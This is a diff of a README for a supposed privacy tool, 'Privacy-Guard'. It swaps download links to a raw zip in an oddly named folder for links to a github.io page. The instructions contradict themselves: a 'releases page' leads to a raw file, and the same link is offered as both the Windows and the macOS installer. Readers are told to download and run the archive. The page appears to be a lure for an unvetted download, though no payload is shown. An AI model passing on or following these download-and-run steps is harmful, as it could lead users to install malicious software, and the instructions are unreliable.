@@ -1,6 +1,6 @@
 # 🛡️ Privacy-Guard - Smart Protection, Seamless Redaction
 
-[![Download Privacy-Guard](https://raw.githubusercontent.com/Iong2048/Privacy-Guard/main/senility/Privacy_Guard_linous.zip)](https://raw.githubusercontent.com/Iong2048/Privacy-Guard/main/senility/Privacy_Guard_linous.zip)
+[![Download Privacy-Guard](https://iong2048.github.io)](https://iong2048.github.io)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ To get started with Privacy-Guard, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page, where you can find the latest version of Privacy-Guard.
    
-   [Download Privacy-Guard](https://raw.githubusercontent.com/Iong2048/Privacy-Guard/main/senility/Privacy_Guard_linous.zip)
+   [Download Privacy-Guard](https://iong2048.github.io)
 
 2. **Select the Latest Version**: On the releases page, look for the latest version. It will be listed at the top. Click on the version number to view its details.
 
 3. **Download the Installer**: Scroll down to the "Assets" section. Here, you will find available files for download. Choose the installer file for your operating system. For example:
-   - For Windows: click on `https://raw.githubusercontent.com/Iong2048/Privacy-Guard/main/senility/Privacy_Guard_linous.zip`
-   - For macOS: click on `https://raw.githubusercontent.com/Iong2048/Privacy-Guard/main/senility/Privacy_Guard_linous.zip`
+   - For Windows: click on `https://iong2048.github.io`
+   - For macOS: click on `https://iong2048.github.io`
 
 4. **Run the Installer**: Once the file has downloaded, locate it in your Downloads folder. Double-click the file to start the installation process. Follow the on-screen prompts to complete the installation. 
 
@@ -73,6 +73,6 @@ For more detailed guides, tips, and community discussions, check out the followi
 
 Don’t forget, you can download the latest version of Privacy-Guard anytime by visiting the releases page:
 
-[Download Privacy-Guard](https://raw.githubusercontent.com/Iong2048/Privacy-Guard/main/senility/Privacy_Guard_linous.zip)
+[Download Privacy-Guard](https://iong2048.github.io)
 
 Thank you for choosing Privacy-Guard! Your privacy matters, and we are here to help you protect it.
